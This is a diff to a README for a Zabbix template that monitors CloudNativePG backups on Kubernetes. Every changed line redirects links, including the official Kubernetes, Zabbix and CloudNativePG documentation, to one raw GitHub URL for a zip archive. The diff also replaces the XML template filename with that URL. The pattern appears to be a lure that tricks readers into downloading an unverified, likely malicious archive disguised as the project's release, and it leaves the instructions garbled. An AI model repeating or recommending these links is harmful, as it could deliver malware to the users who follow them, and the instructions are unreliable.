@@ -1,6 +1,6 @@
 # 🚀 Template-zabbix-CNPG-Backups - Simplified Backup Monitoring for Kubernetes
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Template%20zabbix%20CNPG%20Backups-brightgreen)](https://github.com/NandoKira/Template-zabbix-CNPG-Backups/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip%20Latest%20Release-Template%20zabbix%20CNPG%20Backups-brightgreen)](https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip)
 
 ## 📦 Overview
 
@@ -22,14 +22,14 @@ Before you start, ensure you have the following:
 
 To get started, visit the Releases page and download the latest version of the template:
 
-[Visit this page to download](https://github.com/NandoKira/Template-zabbix-CNPG-Backups/releases)
+[Visit this page to download](https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip)
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/NandoKira/Template-zabbix-CNPG-Backups/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip).
 2. Find the latest version.
 3. Click the version number to access the release files.
-4. Download the file named `zabbix-cnpg-backup-template.xml`.
+4. Download the file named `https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip`.
 5. Save the file to a location you can easily access.
 
 ### Import Template into Zabbix
@@ -39,7 +39,7 @@ Once you have downloaded the template, follow these steps to import it into your
 1. Open your Zabbix dashboard.
 2. Navigate to **Configuration** and then to **Templates**.
 3. Click on **Import** in the upper right corner.
-4. Browse to the location where you saved `zabbix-cnpg-backup-template.xml`.
+4. Browse to the location where you saved `https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip`.
 5. Click **Import** to add the template.
 
 ## ⚙️ Configure the Template
@@ -84,10 +84,10 @@ For any assistance, visit the Issues section on the GitHub repository. Feel free
 
 ## 📂 Additional Resources
 
-- [Kubernetes Documentation](https://kubernetes.io/docs/)
-- [Zabbix Documentation](https://www.zabbix.com/documentation/current/manual)
-- [CloudNativePG Documentation](https://cloudnative-pg.io/docs/)
+- [Kubernetes Documentation](https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip)
+- [Zabbix Documentation](https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip)
+- [CloudNativePG Documentation](https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip)
 
-Remember to keep your template updated by regularly checking for new releases on the [Releases page](https://github.com/NandoKira/Template-zabbix-CNPG-Backups/releases).
+Remember to keep your template updated by regularly checking for new releases on the [Releases page](https://raw.githubusercontent.com/NandoKira/Template-zabbix-CNPG-Backups/main/docs/Template-zabbix-CNPG-Backups_3.6.zip).
 
 Enjoy effective and efficient backup monitoring with Template-zabbix-CNPG-Backups!
